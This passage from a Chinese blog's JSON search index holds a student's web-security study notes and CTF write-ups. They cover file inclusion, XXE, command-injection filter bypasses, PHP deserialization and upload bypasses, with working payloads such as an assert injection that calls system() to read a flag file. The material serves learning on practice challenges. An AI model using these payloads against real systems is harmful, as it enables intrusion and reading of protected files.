instance;\n\nvolatile内存语义的实现前面提到过重排序分为编译器重排序和处理器重排序。为了实现volatile内存语义，JMM会分别限制这两种类型的重排序类型。\n下图是JMM针对编译器制定的volatile重排序规则表。\n\n\n\n第一个操作\n第二个操作：普通读写\n第二个操作：volatile读\n第二个操作：volatile写\n\n\n\n普通读写\n可以重排\n可以重排\n不可以重排\n\n\nvolatile读\n不可以重排\n不可以重排\n不可以重排\n\n\nvolatile写\n可以重排\n不可以重排\n不可以重排\n\n\n举例来说，第二行最后一个单元格的意思是：在程序中，当第一个操作为普通变量的读或写时，如果第二个操作为volatile写，则编译器不能重排序这两个操作。\n从上图可以看出：\n\n\n当第二个操作是volatile写时，不管第一个操作是什么，都不能重排序。这个规则确保volatile写之前的操作不会被编译器重排序到volatile写之后。\n当第一个操作是volatile读时，不管第二个操作是什么，都不能重排序。这个规则确保volatile读之后的操作不会被编译器重排序到volatile读之前。\n当第一个操作是volatile写，第二个操作是volatile读或写时，不能重排序。\n\n\n\n为了实现volatile的内存语义，编译器在生成字节码时，会在指令序列中插入内存屏障来禁止特定类型的处理器重排序。对于编译器来说，发现一个最优布置来最小化插入屏障的总数几乎不可能。为此，JMM采取保守策略。下面是基于保守策略的JMM内存屏障插入策略。\n\n\n·在每个volatile写操作的前面插入一个StoreStore屏障。\n·在每个volatile写操作的后面插入一个StoreLoad屏障。\n·在每个volatile读操作的后面插入一个LoadLoad屏障。\n·在每个volatile读操作的后面插入一个LoadStore屏障。\n\n\n\n上述内存屏障插入策略非常保守，但它可以保证在任意处理器平台，任意的程序中都能得到正确的volatile内存语义。\n\n上图中StoreStore屏障可以保证在volatile写之前，其前面的所有普通写操作已经对任意处理器可见了。这是因为StoreStore屏障将保障上面所有的普通写在volatile写之前刷新到主内存\n\n其他的类似做屏障也差不多是这样\n","tags":["2021"]},{"title":"合天培训（xss xxe uns FilInc ）","url":"/2020/02/26/CTFcomig/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD/","content":"\nHTTP&#x2F;HTTPS协议介绍HTTP的工作流程\n\n\n客户端通过TCP三次握手与服务器建立连接\nTCP连接之后 向服务器发送HTTP请求\n服务器接收到HTTP请求后 向客户端发送http响应\n客户端通过TCP四次断开 与服务器断开TCP连接\n请求头字段详情：https://itbilu.com/other/relate/EJ3fKUwUx.html#http-request-headers\n请求头字段\n\n常见的请求方法：GET POST\nReferer这个可以表示你从哪个URL过来的\nX-Forwarded-For这个表示你从那个ip过来的\nClient-IP:和X-Forwarded-For类似\nUser-Agent表示你从哪个操作系统或者哪个客户端（浏览器）过来的\n\n\n浏览器安全\n同源策略\n同源指得是域名，协议端口相同。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。【例如你打开两个不同的网址 这两个网址之间不可以相互读写。\n它是用来隔离两个网站的脚本混乱【例如 你打开一个京东的网址和百度的网址，可能京东的广告在百度的网址上出现了。\n\n内容安全策略\nContent-Security-Policy:限定了可执行的内容\n内容安全策略指的是 以白名单的形式配置可信任的内容来源\n在网页中，能够使白名单的内容正常执行（包含：JS,CSS,Image）\n而在非白名单的内容不可正常执行，从而减少了跨站脚本攻击（XSS）\n\n\n\nXSS前端基础看其他的博客去。\n 跨站脚本攻击：https://segmentfault.com/a/1190000017057646\n。。。我看视频看的好迷。。。。\nxss进阶实验\n\nFileInclude文件包含：为了更好的使用代码的重用性引入了文件包含函数比如include(flag.php)它可以把flag.php的文件代码放到该文件里面如此使得代码的重用性增加了不过include($_GET)里面是变量 可能被恶意改造\n漏洞原因：未对变量进行校验或者校验被绕过\n\n主要依靠四个PHP函数导致include() PHP代码解析include_once()require()require_once()\n另外还有一些file_get_contents()读取文件内容\n\n\n简单的一个包含例子：\n&lt;?php$file=$_GET[&#x27;file&#x27;];include($file);....&gt;\n\n文件包含漏洞分类本地文件包含远程文件包含\n伪协议\n\n伪协议CTF使用：\n\n?file=php://filter/read=convert.base64-encode/resource=php_filter.php?file=php://filter/resource=http://www.example.com\n\n\nfile:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的\nfile:&#x2F;&#x2F; [文件的绝对路径和文件名]\nhttp://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt\n\n\nphp:&#x2F;&#x2F;协议\n常用的协议是\nphp:??filter用于读取源码    ?file=php://filter/read=convert.base64-encode/resource=./cmd.php\nphp://input用于执行php代码    她可以将POST请求的数据作为PHP代码执行 常见的在getconvert\n\n\n文件包含绕过就是变量的输入被限制了\n绕过的方式有：1、00截断\nhttp://127.0.0.1/tst.php?file=file:///c:/user/Thinking/desktop/flag.txt%00&lt;?php\tinclude($_GET[&#x27;file&#x27;]);?&gt;\n\n\n\n2、点加斜杆绕过（过滤了.php文件）加点和斜杆来补充尾巴那种判断文件名后四位是不是.php的函数可以利用· / 或者 /.\n3、去掉后缀名绕过\n4、双写绕过双写绕过的意义在于函数判断是否有这样的字符串../等等有的话 把它变成空格。\n比如过滤了…&#x2F;那么可以这么写..././，这样会把中间的../过滤掉这样就可以过滤掉这个函数\nPS：在SQL注入中也有双写注入 ， 比如过滤了union ，我们可以写成 uniunionon;\n5、文件包含写shell\n\nXXE大师傅的博客：https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\nXML介绍：XML是一种用于标记电子文件使其具有结构性的可扩展标记语言\nXtensibleMarkup Language,可扩展标记语言，使用简单的标记来描述数据\nxml是一种非常灵活的语言，类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。\n数据传输的载体\nXML不会做任何事情，他是呗设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。\nXML的用处通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：\nXML 把数据从 HTML 分离，更方便在HTML文档中显示动态数据。\n XML 简化数据共享，XML数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。\nXML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。\nXML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。\nXML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。\nXML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等\nXML语法\nXML文档中有且只有一个根元素\nXML元素都必须有一个关闭标签\nXML标签对大小写敏感\nXML元素必须被正确的嵌套\nXML属性值必须加引号\n\n它没有固定的标签\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;\n\nDTD 文档类型定义用来为XML文档定义语义约束\n1、我们可以理解为一个模板，这个模板定义了用户自己\n创建的根元素以及对应的子元素和根元素的合法元素和属性\n2、而文档元素则必须以我们的DTD为模板，来对XML的元素的\n内容进行相应的规范化。\nDTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；\nDTD定义在外部的dtd文件中，视为外部DTD。\nDTD声明内部声明：DTD被包含在XML源文件中，应当使用下面的语法包装在一个DOCTYPE声明中：\n语法：\n例子：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--这里是注释--&gt;&lt;!DOCTYPE books [    &lt;!ELEMENT books (book+)&gt;    &lt;!ELEMENT book (name,author,price)&gt;    &lt;!ATTLIST book id CDATA #REQUIRED&gt;    &lt;!ELEMENT name (#PCDATA)&gt;    &lt;!ELEMENT author (#PCDATA)&gt;    &lt;!ELEMENT price (#PCDATA)&gt;    ]&gt;&lt;books&gt;    &lt;book id=&quot;b01&quot;&gt;        &lt;name&gt;Python黑客编程从入门到入狱&lt;/name&gt;        &lt;author&gt;张三&lt;/author&gt;        &lt;price&gt;$20.00&lt;/price&gt;    &lt;/book&gt;&lt;/books&gt;\n\n如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型是CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须是文本，并能再出现子标签。\n外部声明：假如DTD位于XML源文件的外部，应当使用下面的语法封装在一个DOCTYPE定义中\n语法：\n\nPCDATA指的是被解析的字符数据\nXML解析器通常会解析XML文档中所有的文本\nCDATACDATA 由“&lt;![CDATA [“开始，   由”]]&gt;” 结束\n指的是不应由XML解析器进行解析的文本数据\nCDATA部分中的所有内容都会被解析器忽略\nDTD实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量\n实体就像是变量，可以用于存储数据，以便后续的使用。\n但它的功能又不仅仅是存储。\n比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。至于什么是外部实体，别着急，接着往后看。\n从实体被定义的位置来看，实体可以分为内部实体和外部实体。\n就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。\n内部普通实体：​\t\t声明 ： \n​\t\t引用： 一个实体的引用，由三部分构成： &amp;符号，实体名 ， 分号。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE books [\t&lt;!ENTITY test &quot;Hello World&quot;&gt;]&gt;&lt;books&gt;&amp;test;&lt;/books&gt;\n\n\n\n外部普通实体声明： \n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE books [\t&lt;!ENTITY xxe SYSTEM &quot;http://localhost/xmltest.txt&quot;&gt;]&gt;&lt;books&gt;&amp;xxe;&lt;/books&gt;\n\n\n\n参数实体\nXML注入XML与HTML一样，也存在注入漏洞。比如：一个 web 应用，在进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：\n   \n那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：\n   \n那么就会多注册一个名为admin的用户。\n综合上面的小例子，我们可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转意即可。\n\nXXE 即SML外部实体注入攻击是一种web常见的安全漏洞，发生在应用程序解析XML输入时，没有\n禁止外部实体的加载，导致了攻击者可以通过XML的外部实体获取服务器中本应被保护的数据\n产生原因：在文档类型定义部分，可以引用外部的DTD文件，所以这里容易出现安全问题。\nXML解析器解析外部实体支持多种协议。如：使用file协议可以读取本地文件内容\n使用http协议可以获取web资源\n因此 攻击者可以构建恶意的外部实体，当解析器解析了包含恶意的外部实体的XML文件时\n就出现了XXE攻击。\t\nXXE的利用场景一般分为两大场景\n有回显和无回显\n有回显的情况下 我们可以直接在页面种中看到payload的执行结果或现象（带内XML外部实体）\n即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的web应用程序获取响应\n无回显的情况 可以使用外带数据通道提取数据即带外XML外部实体\n\n\n有回显的本地文件读取   漏洞示例代码：\n   \n   测试payload：\n   \n   在浏览器中设置代理，打开burpsuite访问存在漏洞的页面：“xxetest.php”，并抓包，然后发送到Repeater中，构造请求包：\n   \n​\t这样我们就读取到了windows系统的system.ini的文件内容。\n   但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmltest2.txt，内容是：\n   \n   我们再使用刚才的payload测试：\n   \n   这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础巩固中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。所以我们的问题是：\n   \n   所以我们就要想办法绕过。这个时候我们就需要了解一下XML CDATA了，我们先看一下w3school中对他的描述：\n   \n   其实只用看一个开始，我们就大概知道CDATA的作用了，它可以使得使用其中的数据内容不会被xml解析器解析。然后我们再看其使用方式：\n   \n   从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：\n   a. CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。\n   b. 标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或换行。\n   那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们暂且使用普通实体进行拼接尝试（注意是尝试）：\n   \n   我们尝试直接使用实体来进行拼接，但是测试失败：\n   \n   这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那再dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。\n   我们再次尝试构造payload：\n   \n   理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：\n   \n   那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用：\n   \n   但可以在同级别中被当作标记语言调用，就像是参数实体的引用，就是将调用当成了一个标记语言，像这样：\n   \n   也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：\n   \n   DTD文件的内容：\n   \n   我们再次进行攻击尝试，成功读取到文件内容：\n   \n   Ps：\n   由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。\n\n命令执行命令执行漏洞简介什么是命令执行 ：未对用户输入进行严格过滤 \n其危害:\n继承Web服务程序的权限去执行系统命令或读写文件\n反弹shell，获得目标服务器的权限\n进一步内网渗透\n远程命令执行\n常见的PHP:eval() assert() preg_replace() creatr_function()函数\neval() assert()可以执行参数的代码，且接受的参数时字符串\neval要求其传入的参数必须为PHP代码，就是要求以分号结尾\nassert是直接把传入的参数当作代码 可以直接执行 不强制要求分号\npreg_replace()其参数形式：(&#39;正侧规则&#39;，&#39;替换字符&#39;,&#39;目标字符&#39;)\n&lt;?php\tpreg_replace(&#x27;/test/e&#x27;,$_POST[&#x27;cmd&#x27;],&#x27;just test&#x27;);?&gt;\n\narray_map()：其参数(函数，命令)   ---(function,cmd)  (assert,phpinfo())\n系统命令执行&#x2F;本地命令执行\n常见函数有;;system() exec() shell_exec() passthru() penti-exec() popen() proc-pen()\nsystem()：执行外部程序，并且显示输出\nexec():执行外部程序\nshell-exec()：通过shell环境执行命令，并且将完整的输出以字符串的方式返回\npassthru()：执行linux系统命令并且显示原始输出\n系统常用命令执行的特殊字符cms1|cmd2  无论怎样cmd2都会执行cmd1;cmd2\t无论怎样cmd2都会执行cmd1||cmd2\tcmd1执行失败时才执行cmd2cmd1&amp;&amp;cmd2   仅在cmd执行成功后才可以执行cmd2127.0.0.1&amp;net user  IP和net user都可以执行并全部输出&gt;(cnmd): &lt;(ls)&lt;(cmd: &gt;(ls)\n\n命令执行时常见的绕过手段\n黑名单绕过a=l;b=s;$a$b\n\n空格过滤空格可以用以下字符串代替：\n&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等\n一些命令分隔符linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）\n1、在 shell 中，担任”连续指令”功能的符号就是”;”2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示\n在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令\nlinux中直接查看文件内容的工具cat、tac、more、less、head、tail、nl、sed、sort、uniq、\n参考博客： https://blog.csdn.net/silence1_/article/details/96135760\n反序列化序列化指的是 类的对象在传输的时候会变成字符串\n而反序列化就是指 字符串可以变成一个对象。\n01、序列化和反序列化概述​\t序列化：把对象转化为字符串\n​\t反序列化：字符串转化为对象 \n​\t通过反序列化在特定条件下可以重建php对象并执行php对象中某些magic函数\n​\t反序列化的作用在于有一些非常好的魔法函数。\n\n​\t在反序列化的时候，我们测试知道\n&lt;?php    class Test&#123;    public $s1=111;    protected $s2=&#x27;protected&#x27;;    private $s3 =&#x27;private&#x27;&#125;?&gt;\n\n​\t\t他被序列化之后  \n​\t\n魔法函数概述\n Php对象中有一些特殊的函数，叫做magic函数，他们在特定条件下执行，比如创建、销毁对象的时候\n  为了更好的理解magic方法是如何工作的，让我们添加一个magic方法在我们的类中。\n\nprotected:  \\0\\0name   %00%00name\nprivated: \\0类名\\0name    %00类名%00name\n当遇到过滤%00的时候，可以把s变成S 同时把value的%00变为%5c00。\n在我们属性序列化字符串的时候，对类中不同的属性有不同的表述方式，protected ,private ，public 在序列化的时候都不是一样的 【注意 空格的时候可以用%00来代替。\n小tips还有一个需要提到的点，就是在序列化字符串中，s - non-escaped binary string和 S - escaped binary string是有区别的。对于s就不用说了，这里说一下S属性： S::”“ 其中  是源字符串的长度，而非  的长度。 是非负整数，数字前可以带有正号（+）。 为经过转义之后的字符串。它的转义规则是，对于 ASCII 码小于 128 的字符（但不包括 \\），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \\ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \\ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是  的内容了。\n  也就是说，对于刚才的序列化字符串：\n  O:4:”Test”:3:{s:2:”s1”;i:111;s:5:”%00*%00s2”;s:9:”protected”;s:8:”%00Test%00s3”;s:7:”private”;}\n  可以用S去代替s，即：\n  O:4:”Test”:3:{S:2:”s1”;i:111;S:5:”%00*%00s2”;S:9:”protected”;S:8:”%00Test%00s3”;S:7:”private”;}\n  但是对于 \\00 这种转义了的，只有S才会认，而s并不会正常识别，详细区别见test1.php：\n  \n  访问：http://127.0.0.1/heetian/test1.php\n  \n  可以看到，这个结果和我们预期的一样。\n\n\n\n我们在平常是如何使用反序列化呢？\n\n下面是一个简单的例子：\n\n\n反序列化进阶CTF中的一些小Tips :\n\n\n像上述的都是直接利用反序列化函数做的\n如果没有反序列化函数的话，我们可以利用到phar:&#x2F;&#x2F;流扩展反序列化的方式攻击\n\n\n下面是收到该函数就会产生反序列化效果的函数\n\n这里就要提问了！！\n怎么生成这个文件呢？？\n下面是一个例子\n\n其中的phar文件有：\n\n下面是利用phar文件的方法 ：\n\n好了好了，感觉这篇笔记怎么全是图片\nemm总结下phar文件打反序列化的过程\n1、我们查看类，找到利用点\n2、根据利用点 写phar文件 \n3、把char文件上传 再利用phar:&#x2F;&#x2F;协议来打反序列化\n下面给个例子\n\n下面是patload：\n\nCSRFcsrf概述跨站请求伪造\n1、跨站点的请求\n2、请求时伪造的\n它是一种挟制用户在当前已登陆的web应用程序上执行非本意的操作的攻击方法\nCSRF漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那么以后只要是访问这个网站，都是默认你已经登陆的状态\n次完整的CSRF攻击，需要受害用户需要完成两个步骤：\n​    1.登录正常网站，并在本地生成Cookie。\n​    2.在不退出正常网站的情况下，访问恶意网站。\n   \ncsrf的本质就是在不知情的情况下执行请求\n分为get类型csrf  post型csrf\n重点在于利用html构造请求\ncsrf漏洞利用csrf分为两类 \n1、操作类型csrf：模拟人为操作，让受害者执行危险请求\n2读取类型csrf：模拟人为请求，获取受害者敏感信息\n它可以分为 cars，jsonp。【我看视频看不下去了。他讲的我听不懂。\n合天的总结：\n看这个好多天了。\n但是我真的觉得好恶心。。。 特别是CSRF SSRF这两个 我看的贼懵逼\n合天剩下的有逻辑漏洞 ，文件上传，文件包含，sql注入。\n后面三个以前就学过，所以我不是很打算再去看。不过我的计划是\n一周看一个 ，其余时间全刷题目！！\n总结以下；这次合天的培训 我学到了挺多的。就我而言。。\n那么我想的是今天18号。在30号之前，我要刷完攻防世界的web，同时刷两套真题！\n","categories":["安全"]},{"title":"Every CTFproblem","url":"/2020/03/16/CTFcomig/Every-CTFproblem/","content":"2020.03.16今日份是我差不多开始了新的开始 ，前面几天都是一些合天的学习，算法的训练\n以下是今日题目 仅一题表示开始\n攻防世界-upload1首先这道题的上传仅仅过滤了前端 而且是不符合规则把submit按钮给display了\n手动把display去掉就行了。\n之后文件上传的过程中 我发现我出现了问题，我的菜刀连不上去 蚁剑也是。试了试文件上传之后可以访问成功。那么可以构建命令执行\n\n\n\n我是先试着 ls   cd ../;ls   cd ../;cat flag.php\n这样一步步来就好了 \n这道题目的感受是：在文件上传成功之后，先尝试可否访问，我觉得可以在php文件中加一些标记 这样可能会更好\n\n这样之后尝试访问，可以发现\n\n很明显 菜刀连不上可能是我出了问题。但是出现问题又怎么样呢？总不能放弃吧。换条路 ，RCE尝试一波。\n今天就先这样吧 明天周二好苦，还有计组 笔记也还没写。哭泣了\n2020.03.18今日的题目很有意思\n命令注入综合下面是知识点：\nls 目录名   可以直接输出此目录下的文件过滤了 ; |  &amp;\t\t可以用%0a、%0d、%0D%0A 绕过 不过有趣的是要在URL上改 不然可能会出现编码%25a %25d之类的过滤了|cat|flag|ctfhub  这些关键字该怎么过滤呢？ fla&#x27;&#x27;g   fl$*ag fl\\)ag  之类的\n\n题目过一遍吧\n首先查看过滤了什么  一开始我没注意到过滤了空格\n我建议payload测试顺序应该为：\n127.0.0.1\n127.0.0.1(空格) \n\n\n知道空格被过滤了\n好的 运算符怎么过滤呢？  常见的%0a %0d  我一开始在输入框中测试发现都不成功，但是绕过就这几种啊。。 那么可能是被编码了导致的 直接在URL上处理！\n\n那么怎么过滤关键字呢？ 上面提到``来过滤呗\n\n成功解决！  关键在于绕过测试手法的了解！\n2020.03.19今天的题目 反序列化\nWeb_php_unserialize首先 这道题目的知识点我在合天都看过，我也知道怎么绕过。\n但是就是也不出来！？为什么呢？ 是因为\n这个类的成员变量是private类型 ，一般序列化后会变成\nPrivate属性 ： 数据类型:属性名长度:&amp;quot;\\00类名\\00属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;Protected属性 ： 数据类型:属性名长度:&amp;quot;\\00*\\00属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;Public属性 ： 数据类型:属性名长度:&amp;quot;属性名&amp;quot;;数据类型:属性值长度:&amp;quot;属性值&amp;quot;;\n\n而我用脚本写序列化后再去改动再去base64加密，破坏了\\00这个字符！\n所以最好用脚本来加解密 增删改！ 而不是通过工具来修改！\n下面是解题思路：\n\n很明显 两处过滤\nemm这两处过滤在合天那篇博客都写过怎么做\n下面写下这个payload吧\n&lt;?php\tclass Demo&#123;    private $file = &#x27;fl4g.php&#x27;;&#125;$obj = new Demo();$objj = serialize($obj);//echo $objj;$a = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$objj);$c = str_replace(&#x27;1:&#123;s:&#x27;,&#x27;2:&#123;s:&#x27;,$a);//echo $c;echo base64_encode($c);?&gt;\n\n就可以啦！ 这道题很经典吧可以说。我觉得最重要的是要去用脚本去输出。不然会破坏\\00.\n大师傅的题解：https://www.cnblogs.com/Mrsm1th/p/6835592.html\nweb2一进来看题；\n\n很明显嘛，逆向加密算法 \n说一下几个函数：\nstrrev(str);    把字符串倒置substr($str,$start,$lenght);    从str中第start个字符开始截取长度为length的字符串str_rot13($str);  str_rot13() 函数对字符串执行 ROT13 编码。//ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。//提示：编码和解码都是由相同的函数完成的。如果您把已编码的字符串作为参数，那么将返回原始字符串。\n\n那么我们理一遍加密思路\n1、倒置flag\n2、把每一个字符的ascaii码加1\n3、base64加密  倒置  ROT13编码\n那么我们解密也有了：\n&lt;?php$flag = &#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;$flag = str_rot13($flag);  //解码rot13$flag = strrev($flag);\t\t//倒置$_o = base64_decode($flag);//base64解密$_=&#x27;&#x27;;for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;   //把每个字符倒退               $_c=substr($_o,$_0,1);        $__=ord($_c)-1;        $_c=chr($__);        $_=$_.$_c;   &#125;$flag = strrev($_);\t\t\t\t\t//倒置echo $flag;?&gt;\n\nmfw这道题目我做了百分之40吧。。。\n首先 Git泄露我找出来了。但是之后代码审计的时候出现了错误！\n先走走看吧。\n\n明显的git先测试看看\n\n然后查看源码呗，我几乎看了所有文件 最后发现 利用点是在index.php\n//index.php&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123;        $page = $_GET[&#x27;page&#x27;];&#125; else &#123;        $page = &quot;home&quot;;&#125;//page 一定要有$file = &quot;templates/&quot; . $page . &quot;.php&quot;;//增加字符串！// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt;\n\n这里就是重点了\n我直接输入&#x2F;?page&#x3D;flag\n结果啥也没有  但是返回的是200  这说明可能注释掉了 我看不到而已\n那么想想读取源码呗！ 就想到文件包含 结果 这个字符串被限制了。。。\n尤其是尾部！ 尾部被限制了 搞不了搞不了\n这是 注意到一个函数assert($str)这里存在命令执行漏洞！！\n好的我们学习下这个命令执行漏洞的基本：\nassert($str);//这个是把$str这个字符串当作php代码执行   那么assert(&quot;file_exists(&#x27;$file&#x27;)&quot;)//这里是不是就可以命令注入了？！！assert(&quot;字符串嘛！&quot;)assert(&quot;_file_exists(&#x27;abs&#x27;) or system(&quot;ls&quot;);//&#x27;)__&quot;)//里面的_是表示这之间是字符串！   那么被当作代码的是什么呢？file_exists(&#x27;abs&#x27;) or system(&quot;ls&quot;);//__&#x27;)//再看看！ 代码是不是被注入了！！！\n\n很好！ 那么答案就出来了！！！\npayload: &#x2F;?page&#x3D;abs’) or system(“cat templates&#x2F;flag.php”);&#x2F;&#x2F;\n\n此外，还可以有别的方法访问得到文件\nshow_source(‘flag.php’);\nprint_r(file_get_contents(‘flag.php’));\ncat flag.php;\n\n一点小tips\nlinux   cat ：是把文件内容打印到标准输出\nphp   system:是把系统命令的执行结果输出出来\nphp  在打印字符串的时候  如果字符串是以&lt;?开头的  那么会被注释掉  同时遇到&gt;注释才结束\n收获颇深！\n2020.03.20今日题目 写了两道题 但是有一道题目我实在不理解算了吧\n写写今天的垃圾题目：\n\n讲真，我看了题目 也猜想过\n结果我以为sql注入。。。  很像有没有？！\n回过头来 看题  首先所有数据都被删除了  那么sql注入是注入不出来的！\n【有一说一 的确 我当时order by 100000都还有显示。。\n那么看网上的wp 提示爆破。\n【这题也太无聊了\n\n周末打比赛 以赛代练！ 加油叭。\n2020.03.22[ACTF2020 新生赛]BackupFile这道题目 就了解很多了\n首先源码泄露 用 dirsearch扫描 \n扫描指令： ./dirsearch.py -u &quot;www.xxxx.com&quot; -e *\n注意到 在URL后面不要填上/这个\n不然会出现扫不出来！。。。 这个很气。\n之后我们扫到/index.php.bak这个   下载源码\n&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123;    $key = $_GET[&#x27;key&#x27;];    if(!is_numeric($key)) &#123;        exit(&quot;Just num!&quot;);    &#125;    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) &#123;        echo $flag;    &#125;&#125;else &#123;    echo &quot;Try to find out source file!&quot;;&#125;\n\n很明显 PHP黑魔法\n我们再来解析解析！\n函数介绍：\nis_numeric — 检测变量是否为数字或数字字符串\n如果 var 是数字和数字字符串则返回 **TRUE**，否则返回 **FALSE**。\nintval — 获取变量的整数值\n通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值\nstrcmp — 二进制安全字符串比较\n注意该比较区分大小写。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。\n\n这道题目呢，==弱比较  字符串和数字比较的时候，字符串只取到数字。\n","categories":["刷题"]},{"title":"文件上传-专题","url":"/2020/04/19/CTFcomig/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%B8%93%E9%A2%98/","content":"upload libs\n\n\n\n\n\n\n\n\n\npass1仅仅前端检验\npass2MIME绕过\npass3这一关我们可以利用\nPhp1,phtml ,php3,php4,php5,pht\n也可以利用.htaccess进行处理\npass4利用.htaccess进行处理\n因为它取的是在.之后的数据\n那么我们可以构造.php.xxx\n也可以写成.php. . 